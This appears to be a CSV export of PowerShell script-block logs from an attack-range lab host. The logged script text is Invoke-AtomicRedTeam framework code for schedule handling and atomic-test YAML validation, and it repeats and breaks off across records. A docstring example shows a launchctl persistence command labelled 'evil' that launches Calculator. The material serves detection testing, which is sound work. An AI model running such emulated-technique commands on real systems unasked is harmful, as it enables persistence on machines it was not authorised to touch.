        $old = $schedule | Where-Object { $_.auto_generated_guid -eq $guid }

        if (!$old) {
            $update = $true
            $newSchedule += $fresh
        }

        # Updating schedule with changes
        else {
            if ($fresh -is [array]) {
                $fresh = $fresh[0]
                LogRunnerMsg ""Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).
                            `nCannot Continue Execution. System Exit""
                Write-Host -ForegroundColor Yellow ""Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).
                            `nCannot Continue Execution. System Exit""; Start-Sleep 10
                exit
            }
            $old.Technique = $fresh.Technique
            $old.TestName = $fresh.TestName
            $old.supported_platforms = $fresh.supported_platforms

            $update = $true
            $newSchedule += $old
        }

    }
    if ($update) {
        $newSchedule | Export-Csv $artConfig.scheduleFile
        LogRunnerMsg ""Schedule has been updated with new tests.""
    }
    return $newSchedule

}

function Get-Schedule($listOfAtomics, $filterByEnabled = $true, $testGuids = $null, $filterByPlatform = $true) {
    if ($listOfAtomics -or (Test-Path($artConfig.scheduleFile))) {
        if ($listOfAtomics) {
            $schedule = Import-Csv $listOfAtomics
        }
        else {
            $schedule = Import-Csv $artConfig.scheduleFile
        }

        # Filter schedule to either Active/Supported Platform or TestGuids List
        if ($TestGuids) {
            $schedule = $schedule | Where-Object {
                ($Null -ne $TestGuids -and $TestGuids -contains $_.auto_generated_guid)
            }
        }
        else {
            if ($filterByEnabled -and $filterByPlatform) {
                $schedule = $schedule | Where-Object { ($_.enabled -eq $true -and ($_.supported_platforms -like ""*"" + $artConfig.OS + ""*"" )) }
            }
            elseif ($filterByEnabled) {
                $schedule = $schedule | Where-Object { $_.enabled -eq $true }
            }
            elseif ($filterByPlatform) {
                $schedule = $schedule | Where-Object { $_.supported_platforms -like ""*"" + $artConfig.OS + ""*"" }
            }
        }

    }
    else {
        Write-Host -ForegroundColor Yellow ""Couldn't find schedule file ($($artConfig.scheduleFile)) Update the path to the schedule file in the config or generate a new one with 'Invoke-GenerateNewSchedule'""
    }

    if (($null -eq $schedule) -or ($schedule.length -eq 0)) { Write-Host -ForegroundColor Yellow ""No active tests were found. Edit the 'enabled' column of your schedule file and set some to enabled (True)""; return $null }
    return $schedule
}

function Invoke-GenerateNewSchedule() {
    #create AtomicRunner-Logs directories if they don't exist
    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore | Out-Null
    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore | Out-Null

    LogRunnerMsg ""Generating new schedule: $($artConfig.scheduleFile)""
    $schedule = Get-NewSchedule
    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation
    Write-Host -ForegroundColor Green ""Schedule written to $($artConfig.scheduleFile)""
}

function Invoke-RefreshExistingSchedule() {
    LogRunnerMsg ""Refreshing existing schedule: $($artConfig.scheduleFile)""
    $schedule = Get-ScheduleRefresh
    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation
    Write-Host -ForegroundColor Green ""Refreshed schedule written to $($artConfig.scheduleFile)""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710869","1",", Get","Get [Score: 1]","19795","filter Get-AtomicTechnique {
    <#
    .SYNOPSIS

    Retrieve and validate an atomic technique.

    .DESCRIPTION

    Get-AtomicTechnique retrieves and validates one or more atomic techniques. Get-AtomicTechnique supports retrieval from YAML files or from a raw YAML string.

    This function facilitates the following use cases:

    1) Validation prior to execution of atomic tests.
    2) Writing code to reason over one or more atomic techniques/tests.
    3) Representing atomic techniques/tests in a format that is more conducive to PowerShell. ConvertFrom-Yaml returns a large, complicated hashtable that is difficult to work with and reason over. Get-AtomicTechnique helps abstract those challenges away.
    4) Representing atomic techniques/tests in a format that can be piped directly to ConvertTo-Yaml.

    .PARAMETER Path

    Specifies the path to an atomic technique YAML file. Get-AtomicTechnique expects that the file extension be .yaml or .yml and that it is well-formed YAML content.

    .PARAMETER Yaml

    Specifies a single string consisting of raw atomic technique YAML.

    .EXAMPLE

    Get-ChildItem -Path C:\atomic-red-team\atomics\* -Recurse -Include 'T*.yaml' | Get-AtomicTechnique

    .EXAMPLE

    Get-Item C:\atomic-red-team\atomics\T1117\T1117.yaml | Get-AtomicTechnique

    .EXAMPLE

    Get-AtomicTechnique -Path C:\atomic-red-team\atomics\T1117\T1117.yaml

    .EXAMPLE

    $Yaml = @'
    ---
    attack_technique: T1152
    display_name: Launchctl

    atomic_tests:
    - name: Launchctl
      description: |
        Utilize launchctl

      supported_platforms:
        - macos

      executor:
        name: sh
        command: |
          launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator
    '@

    Get-AtomicTechnique -Yaml $Yaml

    .INPUTS

    System.IO.FileInfo

    The output of Get-Item and Get-ChildItem can be piped directly into Get-AtomicTechnique.

    .OUTPUTS

    AtomicTechnique

    Outputs an object representing a parsed and validated atomic technique.
    #>

    [CmdletBinding(DefaultParameterSetName = 'FilePath')]
    [OutputType([AtomicTechnique])]
    param (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName, ParameterSetName = 'FilePath')]
        [String]
        [Alias('FullName')]
        [ValidateScript({ Test-Path -Path $_ -Include '*.yaml', '*.yml' })]
        $Path,

        [Parameter(Mandatory, ParameterSetName = 'Yaml')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Yaml
    )


    switch ($PSCmdlet.ParameterSetName) {
        'FilePath' {
            $ResolvedPath = Resolve-Path -Path $Path

            $YamlContent = Get-Content -Path $ResolvedPath -Raw
            $ErrorStringPrefix = ""[$($ResolvedPath)]""
        }

        'Yaml' {
            $YamlContent = $Yaml
            $ErrorStringPrefix = ''
        }
    }

    $ParsedYaml = $null

    $ValidSupportedPlatforms = @('windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
    $ValidInputArgTypes = @('Path', 'Url', 'String', 'Integer', 'Float')
    $ValidExecutorTypes = @('command_prompt', 'sh', 'bash', 'powershell', 'manual', 'aws', 'az', 'gcloud', 'kubectl')

    # ConvertFrom-Yaml will throw a .NET exception rather than a PowerShell error.
    # Capture the exception and convert to PowerShell error so that the user can decide
    # how to handle the error.
    try {
        [Hashtable] $ParsedYaml = ConvertFrom-Yaml -Yaml $YamlContent
    }
    catch {
        Write-Error $_
    }

    if ($ParsedYaml) {
        # The document was well-formed YAML. Now, validate against the atomic red schema

        $AtomicInstance = [AtomicTechnique]::new()

        if (-not $ParsedYaml.Count) {
            Write-Error ""$ErrorStringPrefix YAML file has no elements.""
            return
        }

        if (-not $ParsedYaml.ContainsKey('attack_technique')) {
            Write-Error ""$ErrorStringPrefix 'attack_technique' element is required.""
            return
        }

        $AttackTechnique = $null

        if ($ParsedYaml['attack_technique'].Count -gt 1) {
            # An array of attack techniques are supported.
            foreach ($Technique in $ParsedYaml['attack_technique']) {
                if (""$Technique"" -notmatch '^(?-i:T\d{4}(\.\d{3}){0,1})$') {
                    Write-Warning ""$ErrorStringPrefix Attack technique: $Technique. Each attack technique should start with the letter 'T' followed by a four digit number.""
                }

                [String[]] $AttackTechnique = $ParsedYaml['attack_technique']
            }
        }
        else {
            if ((-not ""$($ParsedYaml['attack_technique'])"".StartsWith('T'))) {
                # If the attack technique is a single entry, validate that it starts with the letter T.
                Write-Warning ""$ErrorStringPrefix Attack technique: $($ParsedYaml['attack_technique']). Attack techniques should start with the letter T.""
            }

            [String] $AttackTechnique = $ParsedYaml['attack_technique']
        }

        $AtomicInstance.attack_technique = $AttackTechnique

        if (-not $ParsedYaml.ContainsKey('display_name')) {
            Write-Error ""$ErrorStringPrefix 'display_name' element is required.""
            return
        }

        if (-not ($ParsedYaml['display_name'] -is [String])) {
            Write-Error ""$ErrorStringPrefix 'display_name' must be a string.""
            return
        }

        $AtomicInstance.display_name = $ParsedYaml['display_name']

        if (-not $ParsedYaml.ContainsKey('atomic_tests')) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element is required.""
            return
        }

        if (-not ($ParsedYaml['atomic_tests'] -is [System.Collections.Generic.List`1[Object]])) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element must be an array.""
            return
        }

        $AtomicTests = [AtomicTest[]]::new($ParsedYaml['atomic_tests'].Count)

        if (-not $ParsedYaml['atomic_tests'].Count) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element is empty - you have no tests.""
            return
        }

        for ($i = 0; $i -lt $ParsedYaml['atomic_tests'].Count; $i++) {
            $AtomicTest = $ParsedYaml['atomic_tests'][$i]

            $AtomicTestInstance = [AtomicTest]::new()

            $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'

            if (-not $AtomicTest.ContainsKey('name')) {
                Write-Error ""$ErrorStringPrefix 'atomic_tests[$i].name' element is required.""
                return
            }

            if (-not ($AtomicTest['name'] -is [String])) {
                Write-Error ""$ErrorStringPrefix 'atomic_tests[$i].name' element must be a string.""
                return
            }

            $AtomicTestInstance.name = $AtomicTest['name']
            $AtomicTestInstance.auto_generated_guid = $AtomicTest['auto_generated_guid']

            if (-not $AtomicTest.ContainsKey('description')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element is required.""
                return
            }

            if (-not ($AtomicTest['description'] -is [String])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element must be a string.""
                return
            }

            $AtomicTestInstance.description = $AtomicTest['description']

            if (-not $AtomicTest.ContainsKey('supported_platforms')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element is required.""
                return
            }

            if (-not ($AtomicTest['supported_platforms'] -is [System.Collections.Generic.List`1[Object]])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element must be an array.""
                return
            }

            foreach ($SupportedPlatform in $AtomicTest['supported_platforms']) {
                if ($ValidSupportedPlatforms -cnotcontains $SupportedPlatform) {
                    Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms': '$SupportedPlatform' must be one of the following: $($ValidSupportedPlatforms -join ', ').""
                }
            }

            $AtomicTestInstance.supported_platforms = $AtomicTest['supported_platforms']

            $Dependencies = $null

            if ($AtomicTest['dependencies'].Count) {
                $Dependencies = [AtomicDependency[]]::new($AtomicTest['dependencies'].Count)
                $j = 0

                # dependencies are optional and there can be multiple
                foreach ($Dependency in $AtomicTest['dependencies']) {
                    $DependencyInstance = [AtomicDependency]::new()

                    if (-not $Dependency.ContainsKey('description')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element is required.""
                        return
                    }

                    if (-not ($Dependency['description'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element must be a string.""
                        return
                    }

                    $DependencyInstance.description = $Dependency['description']
                    $StringsWithPotentialInputArgs.Add($Dependency['description'])

                    if (-not $Dependency.ContainsKey('prereq_command')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element is required.""
                        return
                    }

                    if (-not ($Dependency['prereq_command'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element must be a string.""
                        return
                    }

                    $DependencyInstance.prereq_command = $Dependency['prereq_command']
                    $StringsWithPotentialInputArgs.Add($Dependency['prereq_command'])

                    if (-not $Dependency.ContainsKey('get_prereq_command')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element is required.""
                        return
                    }

                    if (-not ($Dependency['get_prereq_command'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element must be a string.""
                        return
                    }

                    $DependencyInstance.get_prereq_command = $Dependency['get_prereq_command']
                    $StringsWithPotentialInputArgs.Add($Dependency['get_prereq_command'])

                    $Dependencies[$j] = $DependencyInstance

                    $j++
                }

                $AtomicTestInstance.dependencies = $Dependencies
            }

            if ($AtomicTest.ContainsKey('dependency_executor_name')) {
                if ($ValidExecutorTypes -notcontains $AtomicTest['dependency_executor_name']) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependency_executor_name': '$($AtomicTest['dependency_executor_name'])' must be one of the following: $($ValidExecutorTypes -join ', ').""
                    return
                }

                if ($null -eq $AtomicTestInstance.Dependencies) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] If 'atomic_tests[$i].dependency_executor_name' is defined, there must be at least one dependency defined.""
                }

                $AtomicTestInstance.dependency_executor_name = $AtomicTest['dependency_executor_name']
            }

            $InputArguments = $null

            # input_arguments is optional
            if ($AtomicTest.ContainsKey('input_arguments')) {
                if (-not ($AtomicTest['input_arguments'] -is [Hashtable])) {
                    $AtomicTest['input_arguments'].GetType().FullName
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must be a hashtable.""
                    return
                }

                if (-not ($AtomicTest['input_arguments'].Count)) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must have at least one entry.""
                    return
                }

                $InputArguments = @{}

                $j = 0

                foreach ($InputArgName in $AtomicTest['input_arguments'].Keys) {

                    $InputArgument = [AtomicInputArgument]::new()

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('description')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element is required.""
                        return
                    }

                    if (-not ($AtomicTest['input_arguments'][$InputArgName]['description'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element must be a string.""
                        return
                    }

                    $InputArgument.description = $AtomicTest['input_arguments'][$InputArgName]['description']

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('type')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type' element is required.""
                        return
                    }

                    if ($ValidInputArgTypes -notcontains $AtomicTest['input_arguments'][$InputArgName]['type']) {
                        Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type': '$($AtomicTest['input_arguments'][$InputArgName]['type'])' should be one of the following: $($ValidInputArgTypes -join ', ')""
                    }

                    $InputArgument.type = $AtomicTest['input_arguments'][$InputArgName]['type']

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('default')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].default' element is required.""
                        return
                    }

                    $InputArgument.default = $AtomicTest['input_arguments'][$InputArgName]['default']

                    $InputArguments[$InputArgName] = $InputArgument

                    $j++
                }
            }

            $AtomicTestInstance.input_arguments = $InputArguments

            if (-not $AtomicTest.ContainsKey('executor')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element is required.""
                return
            }

            if (-not ($AtomicTest['executor'] -is [Hashtable])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element must be a hashtable.""
                return
            }

            if (-not $AtomicTest['executor'].ContainsKey('name')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.name' element is required.""
                return
            }

            if (-not ($AtomicTest['executor']['name'] -is [String])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be a string.""
                return
            }

            if ($AtomicTest['executor']['name'] -notmatch '^(?-i:[a-z_]+)$') {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be lowercased and underscored.""
                return
            }

            if ($ValidExecutorTypes -notcontains $AtomicTest['executor']['name']) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name': '$($AtomicTest['executor']['name'])' must be one of the following: $($ValidExecutorTypes -join ', ')""
                return
            }

            if ($AtomicTest['executor']['name'] -eq 'manual') {
                if (-not $AtomicTest['executor'].ContainsKey('steps')) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element is required when the 'manual' executor is used.""
                    return
                }

                if (-not ($AtomicTest['executor']['steps'] -is [String])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element must be a string.""
                    return
                }

                $ExecutorInstance = [AtomicExecutorManual]::new()
                $ExecutorInstance.steps = $AtomicTest['executor']['steps']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['steps'])
            }
            else {
                if (-not $AtomicTest['executor'].ContainsKey('command')) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element is required when the '$($ValidExecutorTypes -join ', ')' executors are used.""
                    return
                }

                if (-not ($AtomicTest['executor']['command'] -is [String])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element must be a string.""
                    return
                }

                $ExecutorInstance = [AtomicExecutorDefault]::new()
                $ExecutorInstance.command = $AtomicTest['executor']['command']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['command'])
            }

            # cleanup_command element is optional
            if ($AtomicTest['executor'].ContainsKey('cleanup_command')) {
                $ExecutorInstance.cleanup_command = $AtomicTest['executor']['cleanup_command']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['cleanup_command'])
            }

            # elevation_required element is optional
            if ($AtomicTest['executor'].ContainsKey(","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","2",""
"12/16/2024 8:34:55 PM","35710678","1",", Get","Get [Score: 1]","18573","filter Get-AtomicTechnique {
    <#
    .SYNOPSIS

    Retrieve and validate an atomic technique.

    .DESCRIPTION

    Get-AtomicTechnique retrieves and validates one or more atomic techniques. Get-AtomicTechnique supports retrieval from YAML files or from a raw YAML string.

    This function facilitates the following use cases:

    1) Validation prior to execution of atomic tests.
    2) Writing code to reason over one or more atomic techniques/tests.
    3) Representing atomic techniques/tests in a format that is more conducive to PowerShell. ConvertFrom-Yaml returns a large, complicated hashtable that is difficult to work with and reason over. Get-AtomicTechnique helps abstract those challenges away.
    4) Representing atomic techniques/tests in a format that can be piped directly to ConvertTo-Yaml.

    .PARAMETER Path

    Specifies the path to an atomic technique YAML file. Get-AtomicTechnique expects that the file extension be .yaml or .yml and that it is well-formed YAML content.

    .PARAMETER Yaml

    Specifies a single string consisting of raw atomic technique YAML.

    .EXAMPLE

    Get-ChildItem -Path C:\atomic-red-team\atomics\* -Recurse -Include 'T*.yaml' | Get-AtomicTechnique

    .EXAMPLE

    Get-Item C:\atomic-red-team\atomics\T1117\T1117.yaml | Get-AtomicTechnique

    .EXAMPLE

    Get-AtomicTechnique -Path C:\atomic-red-team\atomics\T1117\T1117.yaml

    .EXAMPLE

    $Yaml = @'
    ---
    attack_technique: T1152
    display_name: Launchctl

    atomic_tests:
    - name: Launchctl
      description: |
        Utilize launchctl

      supported_platforms:
        - macos

      executor:
        name: sh
        command: |
          launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator
    '@

    Get-AtomicTechnique -Yaml $Yaml

    .INPUTS

    System.IO.FileInfo

    The output of Get-Item and Get-ChildItem can be piped directly into Get-AtomicTechnique.

    .OUTPUTS

    AtomicTechnique

    Outputs an object representing a parsed and validated atomic technique.
    #>

    [CmdletBinding(DefaultParameterSetName = 'FilePath')]
    [OutputType([AtomicTechnique])]
    param (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName, ParameterSetName = 'FilePath')]
        [String]
        [Alias('FullName')]
        [ValidateScript({ Test-Path -Path $_ -Include '*.yaml', '*.yml' })]
        $Path,

        [Parameter(Mandatory, ParameterSetName = 'Yaml')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Yaml
    )


    switch ($PSCmdlet.ParameterSetName) {
        'FilePath' {
            $ResolvedPath = Resolve-Path -Path $Path

            $YamlContent = Get-Content -Path $ResolvedPath -Raw
            $ErrorStringPrefix = ""[$($ResolvedPath)]""
        }

        'Yaml' {
            $YamlContent = $Yaml
            $ErrorStringPrefix = ''
        }
    }

    $ParsedYaml = $null

    $ValidSupportedPlatforms = @('windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
    $ValidInputArgTypes = @('Path', 'Url', 'String', 'Integer', 'Float')
    $ValidExecutorTypes = @('command_prompt', 'sh', 'bash', 'powershell', 'manual', 'aws', 'az', 'gcloud', 'kubectl')

    # ConvertFrom-Yaml will throw a .NET exception rather than a PowerShell error.
    # Capture the exception and convert to PowerShell error so that the user can decide
    # how to handle the error.
    try {
        [Hashtable] $ParsedYaml = ConvertFrom-Yaml -Yaml $YamlContent
    }
    catch {
        Write-Error $_
    }

    if ($ParsedYaml) {
        # The document was well-formed YAML. Now, validate against the atomic red schema

        $AtomicInstance = [AtomicTechnique]::new()

        if (-not $ParsedYaml.Count) {
            Write-Error ""$ErrorStringPrefix YAML file has no elements.""
            return
        }

        if (-not $ParsedYaml.ContainsKey('attack_technique')) {
            Write-Error ""$ErrorStringPrefix 'attack_technique' element is required.""
            return
        }

        $AttackTechnique = $null

        if ($ParsedYaml['attack_technique'].Count -gt 1) {
            # An array of attack techniques are supported.
            foreach ($Technique in $ParsedYaml['attack_technique']) {
                if (""$Technique"" -notmatch '^(?-i:T\d{4}(\.\d{3}){0,1})$') {
                    Write-Warning ""$ErrorStringPrefix Attack technique: $Technique. Each attack technique should start with the letter 'T' followed by a four digit number.""
                }

                [String[]] $AttackTechnique = $ParsedYaml['attack_technique']
            }
        }
        else {
            if ((-not ""$($ParsedYaml['attack_technique'])"".StartsWith('T'))) {
                # If the attack technique is a single entry, validate that it starts with the letter T.
                Write-Warning ""$ErrorStringPrefix Attack technique: $($ParsedYaml['attack_technique']). Attack techniques should start with the letter T.""
            }

            [String] $AttackTechnique = $ParsedYaml['attack_technique']
        }

        $AtomicInstance.attack_technique = $AttackTechnique

        if (-not $ParsedYaml.ContainsKey('display_name')) {
            Write-Error ""$ErrorStringPrefix 'display_name' element is required.""
            return
        }

        if (-not ($ParsedYaml['display_name'] -is [String])) {
            Write-Error ""$ErrorStringPrefix 'display_name' must be a string.""
            return
        }

        $AtomicInstance.display_name = $ParsedYaml['display_name']

        if (-not $ParsedYaml.ContainsKey('atomic_tests')) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element is required.""
            return
        }

        if (-not ($ParsedYaml['atomic_tests'] -is [System.Collections.Generic.List`1[Object]])) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element must be an array.""
            return
        }

        $AtomicTests = [AtomicTest[]]::new($ParsedYaml['atomic_tests'].Count)

        if (-not $ParsedYaml['atomic_tests'].Count) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element is empty - you have no tests.""
            return
        }

        for ($i = 0; $i -lt $ParsedYaml['atomic_tests'].Count; $i++) {
            $AtomicTest = $ParsedYaml['atomic_tests'][$i]

            $AtomicTestInstance = [AtomicTest]::new()

            $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'

            if (-not $AtomicTest.ContainsKey('name')) {
                Write-Error ""$ErrorStringPrefix 'atomic_tests[$i].name' element is required.""
                return
            }

            if (-not ($AtomicTest['name'] -is [String])) {
                Write-Error ""$ErrorStringPrefix 'atomic_tests[$i].name' element must be a string.""
                return
            }

            $AtomicTestInstance.name = $AtomicTest['name']
            $AtomicTestInstance.auto_generated_guid = $AtomicTest['auto_generated_guid']

            if (-not $AtomicTest.ContainsKey('description')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element is required.""
                return
            }

            if (-not ($AtomicTest['description'] -is [String])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element must be a string.""
                return
            }

            $AtomicTestInstance.description = $AtomicTest['description']

            if (-not $AtomicTest.ContainsKey('supported_platforms')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element is required.""
                return
            }

            if (-not ($AtomicTest['supported_platforms'] -is [System.Collections.Generic.List`1[Object]])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element must be an array.""
                return
            }

            foreach ($SupportedPlatform in $AtomicTest['supported_platforms']) {
                if ($ValidSupportedPlatforms -cnotcontains $SupportedPlatform) {
                    Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms': '$SupportedPlatform' must be one of the following: $($ValidSupportedPlatforms -join ', ').""
                }
            }

            $AtomicTestInstance.supported_platforms = $AtomicTest['supported_platforms']

            $Dependencies = $null

            if ($AtomicTest['dependencies'].Count) {
                $Dependencies = [AtomicDependency[]]::new($AtomicTest['dependencies'].Count)
                $j = 0

                # dependencies are optional and there can be multiple
                foreach ($Dependency in $AtomicTest['dependencies']) {
                    $DependencyInstance = [AtomicDependency]::new()

                    if (-not $Dependency.ContainsKey('description')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element is required.""
                        return
                    }

                    if (-not ($Dependency['description'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element must be a string.""
                        return
                    }

                    $DependencyInstance.description = $Dependency['description']
                    $StringsWithPotentialInputArgs.Add($Dependency['description'])

                    if (-not $Dependency.ContainsKey('prereq_command')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element is required.""
                        return
                    }

                    if (-not ($Dependency['prereq_command'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element must be a string.""
                        return
                    }

                    $DependencyInstance.prereq_command = $Dependency['prereq_command']
                    $StringsWithPotentialInputArgs.Add($Dependency['prereq_command'])

                    if (-not $Dependency.ContainsKey('get_prereq_command')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element is required.""
                        return
                    }

                    if (-not ($Dependency['get_prereq_command'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element must be a string.""
                        return
                    }

                    $DependencyInstance.get_prereq_command = $Dependency['get_prereq_command']
                    $StringsWithPotentialInputArgs.Add($Dependency['get_prereq_command'])

                    $Dependencies[$j] = $DependencyInstance

                    $j++
                }

                $AtomicTestInstance.dependencies = $Dependencies
            }

            if ($AtomicTest.ContainsKey('dependency_executor_name')) {
                if ($ValidExecutorTypes -notcontains $AtomicTest['dependency_executor_name']) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependency_executor_name': '$($AtomicTest['dependency_executor_name'])' must be one of the following: $($ValidExecutorTypes -join ', ').""
                    return
                }

                if ($null -eq $AtomicTestInstance.Dependencies) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] If 'atomic_tests[$i].dependency_executor_name' is defined, there must be at least one dependency defined.""
                }

                $AtomicTestInstance.dependency_executor_name = $AtomicTest['dependency_executor_name']
            }

            $InputArguments = $null

            # input_arguments is optional
            if ($AtomicTest.ContainsKey('input_arguments')) {
                if (-not ($AtomicTest['input_arguments'] -is [Hashtable])) {
                    $AtomicTest['input_arguments'].GetType().FullName
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must be a hashtable.""
                    return
                }

                if (-not ($AtomicTest['input_arguments'].Count)) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must have at least one entry.""
                    return
                }

                $InputArguments = @{}

                $j = 0

                foreach ($InputArgName in $AtomicTest['input_arguments'].Keys) {

                    $InputArgument = [AtomicInputArgument]::new()

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('description')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element is required.""
